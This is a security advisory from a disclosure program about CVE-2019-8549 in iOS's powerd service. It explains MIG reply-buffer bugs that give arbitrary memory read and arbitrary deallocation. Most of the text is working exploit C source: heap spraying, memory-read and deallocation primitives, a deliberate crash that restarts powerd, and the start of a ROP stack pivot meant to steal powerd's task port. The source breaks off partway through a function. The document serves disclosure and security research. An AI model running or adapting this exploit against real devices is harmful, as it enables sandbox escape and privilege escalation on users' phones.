(This advisory follows up on a vulnerability provided in Hack2Win Extreme competition, that won the iOS Privilege Escalation category in our offensive security event in 2018 in Hong Kong – come join us at TyphoonCon – June 2019 in Seoul for more offensive security lectures and training)

**Vulnerabilities Summary**<br>
The following advisory describes security bugs discovered in iOS’s powerd, which leads to arbitrary address read with unlimited amount of memory and an arbitrary address deallocation with arbitrary size, which can lead to Sandbox Escape and Privilege Escalation.

**Vendor Response**<br>
“Power Management
Available for: iPhone 5s and later, iPad Air and later, and iPod touch 6th generation
Impact: A malicious application may be able to execute arbitrary code with system privileges
Description: Multiple input validation issues existed in MIG generated code. These issues were addressed with improved validation.
CVE-2019-8549: Mohamed Ghannam (@_simo36) of SSD Secure Disclosure (ssd-disclosure.com)”

**CVE**<br>
CVE-2019-8549

**Credit**<br>
An independent Security Researcher, Mohamed Ghannam, has reported this vulnerability to SSD Secure Disclosure program.
Affected systems
iOS versions before 12.2.

**Vulnerability Details**<br>
The powerd has its own MIG implementation, it’s based on _SC_CFMachPortCreateWithPort which is nothing more than a wrapper of CFMachPortCreateWithPort, it hosts a MIG callback called mig_server_callback(). This Callback is the main MIG resource handler which acts like mach_msg_server() in user-space or ipc_kmsg_server() in XNU kernel.

When powerd receives a Mach message, it allocates a reply message buffer via CFAllocatorAllocate with the default allocator and then later the reply message got partially initialized in pm_mig_demux().
<img src="https://ssd-disclosure.com/wp-content/uploads/2019/03/iOS-hack2win-extreme-1.png"><br>

We can notice that pm_mig_demux() doesn’t well initialize the reply buffer and only considers the message reply as Simple Mach Message and not a Complex Mach Message .

Unlike the MIG kernel, the MIG semantics in user-space (at least for powerd) is a bit different, the MIG routine takes the ownership of all passed objects (Mach ports, OOL memories and OOL ports), in case of failure, the MIG routine deallocates the appropriate object and returns KERN_SUCCESS (except for some few MIG routines which break this rule) which makes the MIG handler thinks that the routine returned successfully and took the ownership of all passed arguments. This is very important to understand because the bugs hugely rely on this logic.

Another important thing to mention, is that powerd uses retval parameters to store the real return value, this is kind of informing the client whether the Mach message request succeed or failed.

<img src="https://ssd-disclosure.com/wp-content/uploads/2019/03/iOS-hack2win-extreme-2.png"><br>

_io_pm_connection_copy_status() is a simple function which does nothing but returns KERN_SUCCESS, by looking to the MIG generated code, we can see that it has to reply with a complex message:

<img src="https://ssd-disclosure.com/wp-content/uploads/2019/03/iOS-hack2win-extreme-3.png"><br>

From the described above, we are obviously in front of an uninitialized OOL descriptor with full control of the address and size data members.
With some basic knowledge on how Mach IPC works, it’s possible to turn this into arbitrary code execution.
it’s worth noting that this bug does not cause any crash or a undefined behavior (unless the attacker filled memory with meaningful data), and will always returns success to the sender as we’ve seen earlier.
By controlling the uninitialized memory via spraying the heap, we could successfully fake the address and size members of mach_msg_ool_descriptor_t, thus we could reliably read an arbitrary memory address of powerd with unlimited amount of content.

<img src="https://ssd-disclosure.com/wp-content/uploads/2019/03/iOS-hack2win-extreme-4.png"><br>

Here we came across a problem, we cannot control an important member of mach_msg_ool_descriptor_t which is the .deallocate flag, if it is set to TRUE, the sender will directly deallocate the memory, otherwise, it won’t.

Unfortunately, _io_pm_connection_copy_status() sets .deallocate = FALSE, so we cannot make anything more than just reading powerd’s memory content.
We can make this bug more impcatful by finding a vulnerable function with .deallocate flag set to TRUE

After inspecting few MIG methods, we came across this MIG call:
<img src="https://ssd-disclosure.com/wp-content/uploads/2019/03/iOS-hack2win-extreme-5.png"><br>
If we can make sendData to be NULL, the method will jump into exit block and returns KERN_SUCCESS without initializing array_data and array_dataLen.
gHIDEventHistory is a global variable and we don’t have a direct control over it, after looking for a way of controlling it, it is safe to say that there is no direct way to make it invalid.

How can we make gHIDEventHistory invalid?

After inspecting powerd’s behavior, we came across this fact: if we will start a fresh powerd service process, gHIDEventHistory will still contain NULL and only after some time and via a MIG routine it will become a valid CFArray.

We came into this conclusion:
If we can force powerd to restart we can have gHIDEventHistory set to NULL which is sufficient to make sendData to NULL and trigger the bug shown above. In order to do this , we need another memory corruption to just make powerd crashe and Launchd has nothing to do but spawn a fresh powerd instance.

Here is a trivial bug NULL pointer dereference:

<img src="https://ssd-disclosure.com/wp-content/uploads/2019/03/iOS-hack2win-extreme-6.png"><br>
<img src="https://ssd-disclosure.com/wp-content/uploads/2019/03/iOS-hack2win-extreme-7.png"><br>

We can control details_ptr. If we will pass a malformed serialized data into IOCFUnserialize(), it will return NULL, and CFRelease() is called later within details_ptr without checking its value.
By testing out the primitive described above and combining the bugs together, we can turn this bug into Use-After-Deallocate. As an example, we can deallocate the CoreFoundation Library and reading its content with unlimited size:

<img src="https://ssd-disclosure.com/wp-content/uploads/2019/03/iOS-hack2win-extreme-8.png"><br>
And by deallocating such mandatory library, we would expect a random crash as follows:
<img src="https://ssd-disclosure.com/wp-content/uploads/2019/03/iOS-hack2win-extreme-9.png"><br>

**Approach for exploitation**<br>
Once we have the two reliable primitives, we are in front of multiple ways to reach controlling the flow of the execution, in the exploit, we tried to do the following:

We have powersource objects which has a description CF object, this object can be updated by the attacker as he wishes if the current working powersource object has been created by himself.

We will send a very large CF Object with lots of CFData objects with some tagged values, and since we have a reliable primitive to read unlimited amount of memory from powerd, we can locate these objects and get the offset of one of the CFData objects. Later with the deallocation primitive, we will deallocate the located CFData object in page-aligned manner, and re-fill it with user controlled memory.

By sending multiple Mach OOL messages with .copy = MACH_PHYSICAL_COPY, otherwise, we can’t refill memory as we would like, since powerd MIG routines deallocate OOL descriptor in the end of each function, we can successfully control the ISA pointer of the CFData, and by releasing the target powersource->description, we get a PC control with X0 pointing to our controlled payload. And the exploitation becomes straightforward.

**Exploit**<br>
The exploit that will be provided here, steals powerd’s task port using ROP/JOP chains as follow:

* Register (in our exploit) a custom service in launchd with our app group
* Make powerd calls bootstrap_look_up (task_self,”app_group”,&port); using ROP
* Build a fake mach OOL message and put it in a known powerd’s heap address.
* Make powerd call mach_msg_send(msg);

<img src="https://ssd-disclosure.com/wp-content/uploads/2019/03/iOS-hack2win-extreme-10.png"><br>

```c
//
//  code.h
//  powend
//
//  Created by simo on 30/08/2018.
//  Copyright © 2018 simo ghannam. All rights reserved.
//

#ifndef code_h
#define code_h

#include <stdio.h>
#include <mach/mach.h>
#include <CoreFoundation/CoreFoundation.h>
#define kIOPMServerBootstrapName    "com.apple.PowerManagement.control"

#define APP_GROUP               "group.simo.ghannam"
#define FAKE_SERVICE_NAME       APP_GROUP".fake"

#define msgh_request_port   msgh_remote_port
#define msgh_reply_port     msgh_local_port
enum {
    kIOPSSourceAll = 0,
    kIOPSSourceInternal,
    kIOPSSourceUPS,
    kIOPSSourceInternalAndUPS,
    kIOPSSourceForAccessories
};

//get host_priv
struct hp_msg {
    mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_port_descriptor_t port;
};

struct hp_msg_recv {
    mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_port_descriptor_t port;
    mach_msg_trailer_t trailer;
};

int do_powend(void);
int do_test(void);
void DumpHex(const void* data, size_t size);
mach_port_t get_service_port(char *);
uint8_t *do_dummy_allocate_p(uint32_t size,char init);
void do_prepare_data(void);

uint64_t do_get_payload_address(uint64_t *,int *);
uint64_t mem_search(uint64_t base, const void* data, size_t size);
void do_leak_payload_address(void);
void start_exploit(void);
int fill_memory_with_user_data(uint64_t target,uint32_t size,uint32_t magic,uint64_t *addr);
extern kern_return_t bootstrap_look_up(mach_port_t bs, const char *service_name, mach_port_t *service);
kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t *address, mach_vm_size_t size, int flags);
/* IOKit */
extern CFDataRef IOCFSerialize( CFTypeRef object, CFOptionFlags options );
extern CFTypeRef IOCFUnserialize(const char *buffer, CFAllocatorRef allocator, CFOptionFlags  options,CFStringRef  *errorString);
typedef char name_t[128];
/* bootstrap */
extern kern_return_t bootstrap_check_in(mach_port_t bp, const name_t service_name,mach_port_t *sp);

/* MIG calls */
kern_return_t io_ps_new_pspowersource
(
 mach_port_t server,
 int *psid,
 int *return_code
 );
/* Routine io_pm_assertion_copy_details */
kern_return_t io_pm_assertion_copy_details
(
 mach_port_t server,
 int assertion_id,
 int whichData,
 vm_offset_t props,
 mach_msg_type_number_t propsCnt,
 vm_offset_t *assertions,
 mach_msg_type_number_t *assertionsCnt,
 int *return_val
 );

/* Routine io_ps_update_pspowersource */
kern_return_t io_ps_update_pspowersource
(
 mach_port_t server,
 int psid,
 vm_offset_t psdetails,
 mach_msg_type_number_t psdetailsCnt,
 int *return_code
 );

kern_return_t io_ps_copy_powersources_info
(
 mach_port_t server,
 int pstype,
 vm_offset_t *powersources,
 mach_msg_type_number_t *powersourcesCnt,
 int *return_code
 );

/* B:Routine io_pm_connection_copy_status */
kern_return_t io_pm_connection_copy_status
(
 mach_port_t server,
 int status_index,
 vm_offset_t *status_data,
 mach_msg_type_number_t *status_dataCnt,
 int *return_val
 );

/* B:Routine io_pm_hid_event_copy_history */
kern_return_t io_pm_hid_event_copy_history
(
 mach_port_t server,
 vm_offset_t *eventArray,
 mach_msg_type_number_t *eventArrayCnt,
 int *return_val
 );

/* Routine io_ps_release_pspowersource */
kern_return_t io_ps_release_pspowersource
(
 mach_port_t server,
 int psid
 );
/* Routine io_pm_last_wake_time */
kern_return_t io_pm_last_wake_time
(
 mach_port_t server,
 vm_offset_t *wakeData,
 mach_msg_type_number_t *wakeDataCnt,
 vm_offset_t *deltaData,
 mach_msg_type_number_t *deltaDataCnt,
 int *return_val
 );



#endif /* code_h */
```

```c
//
//
//  uexploit.c
//  powend
//
//  Created by simo on 30/08/2018.
//  Copyright © 2018 simo ghannam. All rights reserved.
//
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <mach/mach.h>
#include <mach-o/dyld_images.h>
#include <sys/sysctl.h>
#include <unistd.h>
#include <objc/objc.h>
#include <sys/mman.h>
#include <CoreFoundation/CoreFoundation.h>
#include <pthread.h>
#include "code.h"

#define READ_MEMORY         fill_memory_with_user_data
#define DEALLOCATE_MEMORY   deallocate_memory_user
//#define MEMDUMP

#define CHECK_MACH_ERR(kr,name)   if (kr != KERN_SUCCESS) {\
    printf("%s : %s (0x%x)\n",name,mach_error_string(kr),kr); \
    exit(-1); }

#define MAGIC_TAG 0xbadbadcc

mach_port_t service_port = MACH_PORT_NULL;
uint8_t *p = NULL;
uint32_t psizeP = 0x30000;
int Iter = 1000;
//uint64_t condidates[0x100] = {0};
uint64_t *condidates = NULL;
uint32_t collected = 0;
uint8_t *main_payload = NULL;
uint32_t main_payload_size = 0;
uint32_t payload_size = 0;
uint64_t payload_address = 0;
int target_psid = 0;
uint8_t *prestore = NULL;
uint32_t prestore_size = 0;
uint64_t control_x0,br_x3,br_x6,control_x0_and_blr;
uint64_t stack_pivot,mach_msg_gadget,stack_ptr,restore_registers,ret_sp;
mach_port_t fake_service_port = 0;

pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;

pthread_mutex_t powerd_task_lock;
pthread_cond_t  powerd_task_cond;
// our final goal is to get host_priv port
mach_port_t host_priv = MACH_PORT_NULL;
mach_port_t powerd_task_port =MACH_PORT_NULL;
pthread_t svc;

int strt_exp = 0;

void send_pegged_payload(mach_port_t service_port, const char *buf,uint32_t size) {
    kern_return_t kr;
    struct {
        mach_msg_header_t hdr;
        mach_msg_body_t body;
        mach_msg_ool_descriptor_t ool_desc;
    } m = {};

    m.hdr.msgh_size = sizeof(m);
    m.hdr.msgh_local_port = MACH_PORT_NULL;
    m.hdr.msgh_remote_port = service_port;
    m.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    m.hdr.msgh_bits |= MACH_MSGH_BITS_COMPLEX;
    m.hdr.msgh_id = 73019; // let's mimic c_s

    m.body.msgh_descriptor_count = 1;
    m.ool_desc.type = MACH_MSG_OOL_DESCRIPTOR;
    m.ool_desc.address = (void*)&buf[0];
    m.ool_desc.size = size;
    m.ool_desc.deallocate = 0;
    m.ool_desc.copy = MACH_MSG_PHYSICAL_COPY; // very important
    kr = mach_msg(&m.hdr,
                   MACH_SEND_MSG,
                   m.hdr.msgh_size,
                   0,
                   MACH_PORT_NULL,
                   MACH_MSG_TIMEOUT_NONE,
                   MACH_PORT_NULL);

    CHECK_MACH_ERR(kr,"mach_msg()");

}

uint8_t *do_dummy_allocate_p(uint32_t size,char init)
{
    vm_address_t addr = 0;
    int kr = vm_allocate(mach_task_self(),&addr,size,1);
    CHECK_MACH_ERR(kr,"vm_allocate()");

    memset((void*)addr,init,size);
    char *p = (char*)addr;
    p[size-1] = '\0';
    return (uint8_t*)addr;
}

// if psid is -1, create a new ps entry
void do_update_ps(mach_port_t sp,int *upsid,int iter,uint8_t *p1,uint32_t psize)
{
    kern_return_t kr = 0;
    // we have to call io_ps_new_pspowersource() first
    // to create a new ps object

    CFMutableDictionaryRef Dict1;
    int ret;
    ret = -1;
    int psid = *upsid;
    /*
    if(psize > psizeP) {
        vm_deallocate(mach_task_self(),p,psizeP);
        psizeP = psize;
        p = do_dummy_allocate_p(psizeP, 0xcc);
    }
     */

    // if psid is -1, we've to create new powersource object
    if(psid == -1) {

        kr = io_ps_new_pspowersource(sp,&psid,&ret);
        if(ret) {
            printf("io_ps_new_pspowersource() -> kr = %d,psid = 0x%x, ret = 0x%x\n",kr,psid,ret);
            exit(0);
        }
#if 0
    printf("io_ps_new_pspowersource() -> kr = %d,psid = 0x%x, ret = 0x%x\n",kr,psid,ret);
    printf("[+] a new PS object has been created = 0x%x \n",psid);
#endif
        *upsid = psid;
        if(ret) {
            printf("io_ps_new_pspowersource() -> kr = %d,psid = 0x%x, ret = 0x%x\n",kr,psid,ret);
            exit(0);
        }
    } else
        ;//printf("[+] updating PS description = 0x%x\n",psid);

    ret = 0;
    uint32_t size = psize;

    Dict1 = CFDictionaryCreateMutable(NULL,0x10000,&kCFTypeDictionaryKeyCallBacks,&kCFTypeDictionaryValueCallBacks);


    for(int i =0;i<iter;i++) {
        char key[16] ={0};
        sprintf(key,"%d",i+1);
        //CFNumberRef psIDKey = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &i);

        // create the key of dictionary + put payload in CFData
        CFStringRef str = CFStringCreateWithCString(0,key,kCFStringEncodingUTF8);
        //CFStringRef Data = CFStringCreateWithCString(0,(const char *)p,0);
        CFDataRef Data = CFDataCreate(NULL,(const UInt8 *)p1,size);

#if 0
        if(Data == NULL) {
            printf("Data corruption, failed .. !\n");
            exit(-1);
        }
        printf("CFData : %p \n",Data);
#endif
        //printf("CFData (%d): %p \n",i,Data);
        //CFDictionarySetValue(Dict, str, Data);
        CFDictionaryAddValue(Dict1,str,Data);
        CFRelease(str);
        CFRelease(Data);
#if 0
        // for test only
        vm_deallocate(mach_task_self(),(vm_address_t)p,size);
#endif

    }

   // some data requirments here to fill the psID.decription buffer
#define kIOPSTypeKey                "Type"
#define kIOPSUPSType                "UPS"
    CFDictionarySetValue(Dict1, CFSTR(kIOPSTypeKey), CFSTR(kIOPSUPSType));

    CFDataRef obj = IOCFSerialize(Dict1,0);
#if 0
    printf("DEBUG IOCFSerialize() : obj=%p size=0x%x\n",CFDataGetBytePtr(obj), (int)CFDataGetLength(obj));
#endif
    ret = 0;

    kr = io_ps_update_pspowersource(sp,
                                    psid,
                                    (vm_offset_t) CFDataGetBytePtr(obj),
                                    (uint32_t)CFDataGetLength(obj),
                                    &ret);

    if (ret != 0) {
        printf("io_ps_update_pspowersource() -> kr = %x,ret = 0x%x -> %s \n",kr,ret, mach_error_string(kr));
        printf("Provided psid (0x%x) is not found, exiting, err=0x%x .. \n",psid,ret);
        //abort();
    }
    CFRelease(obj);
    obj = NULL;
#if 0
    printf("io_ps_update_pspowersource() -> kr = %x,ret = 0x%x -> %s \n",kr,ret, mach_error_string(kr) );
    DumpHex((void*)data, cnt);
#endif
    if(Dict1) {
        CFRelease(Dict1);
        Dict1 = NULL;
    }
}

void do_io_pm_last_wake_time(mach_port_t sp)
{
    vm_offset_t wakeData,deltaData;
    wakeData = deltaData = 0;
    uint32_t wakeDataCnt,deltaDataCnt;
    wakeDataCnt = deltaDataCnt = 0;
    kern_return_t kr = 0;
    int ret = 0;
    kr = io_pm_last_wake_time(sp,&wakeData,&wakeDataCnt,
                              &deltaData,&deltaDataCnt,&ret);
#if 0
    printf("io_pm_last_wake_time() : \nkr = %d ,wakeData = 0x%lx,wDcnt = 0x%x "
           ",deltaData =0x%lx,deltaDataCnt = 0x%x, ret = 0x%x\n"
           ,kr,wakeData,wakeDataCnt,deltaData,deltaDataCnt,ret);
    DumpHex((void*)wakeData,wakeDataCnt);
    DumpHex((void*)deltaData,deltaDataCnt);
#endif
}

// this will crash powerd, very important step to make arbitrary address deallocation
static void do_crash_powerd(void)
{
    /*
     kern_return_t _io_ps_update_pspowersource(...) {
     details = (CFMutableDictionaryRef)IOCFUnserialize((const char *)details_ptr, NULL, 0, NULL);
     ...

     if (kIOReturnSuccess != *return_code) { <-- it doesn't check if details is NULL
        CFRelease(details); <-- passing NULL ptr here
     }
     */
    printf("[+] Killing powerd and force it to restart\n");
    do_prepare_data();
    uint32_t s = 4096;
    uint8_t *b = malloc(s);
    int ret = 0;
    io_ps_update_pspowersource(service_port,0,(vm_offset_t)b,s,&ret);
}

vm_offset_t data= 0;
mach_msg_type_number_t cnt=1000;
int ret=0;

void ping(mach_port_t port) {
    struct {
        mach_msg_header_t hdr;
        mach_msg_body_t body;
    } m;

    m.hdr.msgh_size = sizeof(m);
    m.hdr.msgh_local_port = MACH_PORT_NULL;
    m.hdr.msgh_remote_port = port;
    m.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    m.hdr.msgh_bits |= MACH_MSGH_BITS_COMPLEX;
    m.hdr.msgh_id = 0;

    m.body.msgh_descriptor_count = 0;

    mach_msg(&m.hdr,
                                 MACH_SEND_MSG,
                                 m.hdr.msgh_size,
                                 0,
                                 MACH_PORT_NULL,
                                 MACH_MSG_TIMEOUT_NONE,
                                 MACH_PORT_NULL);

}
void do_prepare_data(void)
{
    mach_port_t bs;
    kern_return_t kr;

    task_get_bootstrap_port(mach_task_self(), &bs);
    kr = bootstrap_look_up(bs, kIOPMServerBootstrapName, &service_port);
    CHECK_MACH_ERR(kr,"bootstrap_look_up()");   
    ping(service_port);

    if(data)
        vm_deallocate(mach_task_self(),data,cnt);

    kr = vm_allocate(mach_task_self(),&data,cnt,1);
    if(!p)
        p = do_dummy_allocate_p(psizeP,0xaa);

}
uint64_t get_library_address(const char* library_name) {
    task_dyld_info_data_t task_dyld_info;
    mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;

    task_info(mach_task_self(), TASK_DYLD_INFO, (task_info_t)&task_dyld_info, &count);

    const struct dyld_all_image_infos* all_image_infos = (const struct dyld_all_image_infos*)task_dyld_info.all_image_info_addr;
    const struct dyld_image_info* image_infos = all_image_infos->infoArray;

    for (size_t i = 0; i < all_image_infos->infoArrayCount; i++) {
        const char* image_name = image_infos[i].imageFilePath;
        mach_vm_address_t image_load_address = (mach_vm_address_t)image_infos[i].imageLoadAddress;
        if (strstr(image_name, library_name)){
            //printf("[+] %s address 0x%llx \n",library_name,(uint64_t)image_load_address);
            return (uint64_t)image_load_address;
        }
    }
    return 0;
}
int comp_uint64(const void *a, const void *b)  {
    if(*((uint64_t *)a) > *((uint64_t *)b))  return(+1);
    if(*((uint64_t *)a) < *((uint64_t *)b))  return(-1);
    return(0);
}

uint64_t *collect_user_memory(int cnt)
{
    int psidCnt = 2,psid=-1;
    int ps[psidCnt];
    uint32_t magic = 0xbadc0de;
    uint32_t condidate = 0;
    int cncnt = cnt;
    uint32_t size = 0x2000;
    //uint32_t size = getpagesize();

    uint64_t *collect = calloc(cncnt+1,sizeof(uint64_t));
    uint8_t *pcum = do_dummy_allocate_p(size, 0xF0);

    *(uint64_t*)((uint8_t*)(pcum+0x1C))        = 0;             // address
    *(uint32_t*)((uint8_t*)(pcum+0x1C+24))     = 0x1000;       // size
    *(uint32_t*)((uint8_t*)(pcum+0x1C+24+4))   = magic;       // magic value in return value

    int iter = 100;
    for(int i=0;i<psidCnt;i++) {
        psid = -1;
        do_update_ps(service_port, &psid,iter,pcum,size);
        ps[i] = psid;
        //target_psid = psid; // we'll likely allocate 1 powersource object
    }

    int count = 0;
    for(int i=0; count < cncnt ; i++) {

        for(int i=0; i<psidCnt; i++)
            do_update_ps(service_port, &ps[i],iter,pcum,size);

        //do_update_ps(service_port, &target_psid,100,pcum,size);
        ret = -1;
        io_pm_connection_copy_status(service_port,0x10,&data,&cnt,&ret);
        //printf("iter(%d) : kr = %d ,offset = 0x%lx,cnt = %x,retval :%x \n",i,kr,data,cnt,ret);

        if ((ret != 0) && (ret != magic)) {
            if(ret & 0xf)
                continue;

            condidate = ret;
            collect[count++] = ret | 0x100000000;
            //printf("Collected  : 0x%llx\n",collect[count-1]);

        }

    }

    collect[cncnt] = 0xbadc0de; // delemiter
    qsort(collect,count,sizeof(uint64_t),comp_uint64);

    printf("[+] Collected heap objects: %d objects\n",count);
#ifdef MEMDBG
    for(int i=0;i<count;i++)
        printf("Potential memory address %d -> 0x%llx\n",i,collect[i]);
#endif
#if 0
    // Read collected memory
    for(int i=0;i<collected;i++) {
        uint64_t guess = 0;
        if(!fill_memory_with_user_data(collect[i], 0x100, 0xdead+i, &guess)) {
            printf("failed\n");
            continue;
        }
    }
#endif

    // release powersource objects as always
    for(int i=0;i<psidCnt;i++) {
        io_ps_release_pspowersource(service_port,ps[i]);
        //ps[i] = -1;
    }

    vm_deallocate(mach_task_self(), (vm_address_t)pcum, size);
    return collect;
}

int fill_memory_with_user_data(uint64_t target,uint32_t size,uint32_t magic,uint64_t *addr)
{
    int psidCnt = 2,psid=-1;
    int psids[100] = {-1};
    kern_return_t kr = KERN_SUCCESS;
    int found = 0;
    /**/
    if(size > psizeP) {
        printf("Check the size plz, don't make crap \n");
        exit(-1);
    }
    uint64_t *val = (uint64_t*)&p[0];
    // poisoning
    //for(int i= 0;i<(size/8);i++) {
    //    val[i] = 0xaaaaaaaaaaad0000 | i;
    //}

    *(uint64_t*)((uint8_t*)(p+0x1C))        = target;       // address
    *(uint32_t*)((uint8_t*)(p+0x1C+24))     = size;         // size
    *(uint32_t*)((uint8_t*)(p+0x1C+24+4))   = magic;       // magic value in return

    for(int i=0;i<psidCnt;i++) {
        psid = -1;
        do_update_ps(service_port, &psid,100,p,size);
        psids[i] = psid;
    }


    //for(int i=0; i<900; i++) {
    for(int i=0; i<Iter; i++) {
        for(int i=0; i<psidCnt; i++)
            do_update_ps(service_port, &psids[i],100,p,size);

        ret = -1;
        kr = io_pm_connection_copy_status(service_port,0x10,&data,&cnt,&ret);

        if(ret == magic) {
            if(addr)
                *addr = data;
#ifdef MEMDBG
            printf("[+] Reading 0x%llx \n",target);
            printf("iter(%d) : kr = %d ,offset = 0x%lx,cnt = %x,retval :%x \n",i,kr,data,cnt,ret);
            // cnt is fine, the same as size
            //DumpHex((void*)data,0x100);

            printf("******** MEMORY READ ******* \n");

#endif
#ifdef MEMDUMP
            DumpHex((void*)data,0x100);
            printf("******** MEMORY READ ******* \n");
#endif

            found = 1;
            goto finish;
        }

    }
finish:
    // free psid allocated by us
    for(int i=0;i<psidCnt;i++) {
        io_ps_release_pspowersource(service_port,psids[i]);
        psids[i] = -1;
    }

    return found;
}

// returns the offset of the current address
uint64_t find_location_by_value(uint64_t addr, uint32_t size,uint64_t value,uint64_t *code)
{
    uint64_t *vals = (uint64_t*)addr;
    uint64_t begin = value & 0xffffffff00000000;
    uint64_t off = 0;

    // we intend to search by +8 reather than +1
    for(int i=0;i<(size/8);i++) {
        if((vals[i] & 0xffffffff00000000) == begin) {
            off = (vals[i] & 0xffff) * 8;
            *code = vals[i];
            break;
        }
    }

    return off;
}

// this will deallocate a target buffer
int deallocate_memory_user(uint64_t target,uint32_t size)
{
    int psidCnt = 2,psid=-1;
    int psids[100] = {-1};
    kern_return_t kr = KERN_SUCCESS;
    int found = 0;
    int iters = 100;
    uint32_t sz = 0x1000;
    for(int i=0;i<psidCnt;i++) {
        psid = -1;
        do_update_ps(service_port, &psid,iters,p,sz);
        psids[i] = psid;
    }

    *(uint64_t*)((uint8_t*)(p+0x1C))        = target;  // address
    *(uint32_t*)((uint8_t*)(p+0x1C+24))     = size;            // size
    *(uint32_t*)((uint8_t*)(p+0x1C+24+4))   = MAGIC_TAG;        // useless in this case, we must not reply on it

    for(int i=0; i<Iter; i++) {

        // instead of releasing psid each time (which affects our heap Feng shui)
        // we release only ps->description which is a serialized CF Dict object
        // then allocate a new CFDict, this will ensure that our payload can take
        // reply's buffer at least 4 times.
        for(int i=0; i<psidCnt; i++)
            do_update_ps(service_port, &psids[i],iters,p,sz);

        ret = -1;
        // io_pm_hid_event_copy_history() has .deallocate flag TRUE, so the ool_dsc.address will
        // be implicitly deallocated right after the message sent to the receiver,
        // we'll try to to profit from this feature and deallocate an arbitrary address from process
        kr = io_pm_hid_event_copy_history(service_port,&data,&cnt,&ret);

        //if(ret == MAGIC_TAG) {
        if(cnt != 0) {
            found = 1;
#ifdef MEMDBG
            printf("iter(%d) : kr = %d ,offset = 0x%lx,cnt = %x,retval :%x \n",i,kr,data,cnt,ret);
#endif
#ifdef MEMDUMP
            DumpHex((void*)data,0x100);
            printf("******** MEMORY READ/DEALLOCATED ******* \n");
#endif
            goto finish;
        }

    }
//finish:
    // free psid allocated by us
    for(int i=0;i<psidCnt;i++) {
        io_ps_release_pspowersource(service_port,psids[i]);
        psids[i] = -1;
    }
   finish:
    return found;
}

uint64_t mem_search(uint64_t base, const void* data, size_t size) {
    const uint8_t* p = (const uint8_t*)base;
    for (;;) {
        if (!memcmp(p, data, size))
            return (uint64_t)p;

        p++;
    }
    return 0;
}
// Allocate a bunch of memory pages, and lookup for a magic value
// by inspecting condidates addresses, if found , do not release the object
// we'll use it to CFRelease(ps->description)

// returns a page-aligned memory location
uint64_t do_get_payload_address(uint64_t *diff,int *ps_id)
{
    uint64_t paddr = 0,cfaddr = 0;
    int pscnt = 1;
    int ps[pscnt];
    uint64_t guess = 0;
    uint32_t size = 0x2000;//getpagesize();
    //uint32_t size = getpagesize();
    uint8_t *p = do_dummy_allocate_p(size, 0xf5);
    uint64_t *val = (uint64_t*)&p[0];
    uint32_t tagsize = size;
    // uint32_t tagsize = size -payload_size;
    uint32_t start = -1;
    uint64_t shift = 0;
    //memcpy(&p[payload_size],main_payload,payload_size);

    uint64_t tagged = 0;
repeat:
    // avoid inspecting freed memory
    tagged = (0xbadc0deb00000000 | (shift++ << 56));
    // make sure that we condidates addresses with our payload
    for(int i=0; i<pscnt; i++) {
        // <tag> <ps id> <offset>
        for(int j=0; j<(tagsize/8); j++)
            val[j] = tagged | j | ((i+1) << 16) ;

        ps[i] = -1;
        do_update_ps(service_port, &ps[i],100,p,size);
        //printf("Creating powersource object with id = 0x%x, index = %d\n",ps[i],i+1);
    }

    uint64_t off = 0,code =0;
    for(int i=0;i<collected;i++) {
        uint64_t guess = 0;
        uint32_t readsize = 0x100;
        if(!READ_MEMORY(condidates[i], readsize, 0xdead+i, &guess))
            continue;
#if 0
        DumpHex((const void*)guess, 0x100);
#endif
        off = find_location_by_value(guess,readsize,tagged,&code);
        if(off == 0) {// || (target-off-0x30) & 0xfff) {
            continue;
        }

        // get the object id + payload address
        start = (code & 0xffff0000) >> 16;
        cfaddr = condidates[i] - off - 0x30; // 0x30 for CFData metadata, cfaddr must point to the isa pointer
        //payload_address = cfaddr + 0x30 + tagsize; // where our payload is located

        paddr = cfaddr & ~(getpagesize()-1);
        *diff = cfaddr - paddr;
#ifdef MEMDBG
        printf("The target powersource object is : %d\n",start);
        printf("We Found a potential memory location : 0x%llx\n",condidates[i]);

        printf("We Got a reliable CFData Object : 0%llx\n",cfaddr);

        printf("READING CFData object content : \n");
        Iter = 1000;
        if(!READ_MEMORY(cfaddr, readsize, 0xdead+i, &guess)) {
            printf("failed\n");
            continue;
        }
        DumpHex((const void*)guess, 0x100);
        Iter = 100;
#endif
        break;

    }
    // it looks like we failed, let's repeat
    if (paddr == 0) {
        printf("[-] Failed to get a CFData address, let's repeat\n");
        for(int i=0; i<pscnt; i++) {
            io_ps_release_pspowersource(service_port,ps[i]);
            ps[i] = -1;
        }
        goto repeat;
    }

    *ps_id = ps[start - 1];
    ps[start - 1] = -1;
    // release all allocated ps objects except the target one
    /*
    for(int i=0; i<pscnt; i++)
        io_ps_release_pspowersource(service_port,ps[i]);
    */
    prestore_size = getpagesize();
    prestore = do_dummy_allocate_p(prestore_size, 0);
    printf("[+] Retrieving Memory content of 0x%llx with size of 0x%x\n",paddr,prestore_size);
    for(int i =0;i<prestore_size;i+=0x1000) {
        Iter = 1000;

        if(!READ_MEMORY(paddr+i, 0x1000, 0x1234+i, &guess)) {
            printf("failed\n");
            abort();
        }
        memcpy(&prestore[i], (void*)guess, 0x1000);
        vm_deallocate(mach_task_self(),guess,0x1000);
    }
#if 0
    printf("Reading prestore memory \n");
    DumpHex((const void*)prestore, getpagesize());
#endif

    return paddr;
}
uint64_t rop_offset = 0;
uint64_t stack_offset = 0;
static inline void rop_make_stack_pivot(uint64_t stack_pointer, uint64_t lr)
{
#if 0 /* stack pivot gadget */
    0x1f6e7c5a0 <+8>:  ldr    x16, [x16, #0x38] // gadget starts here
    0x1f6e7c5a4 <+12>: ldp    x19, x20, [x0]
    0x1f6e7c5a8 <+16>: ldp    x21, x22, [x0, #0x10]
    0x1f6e7c5ac <+20>: ldp    x23, x24, [x0, #0x20]
    0x1f6e7c5b0 <+24>: ldp    x25, x26, [x0, #0x30]
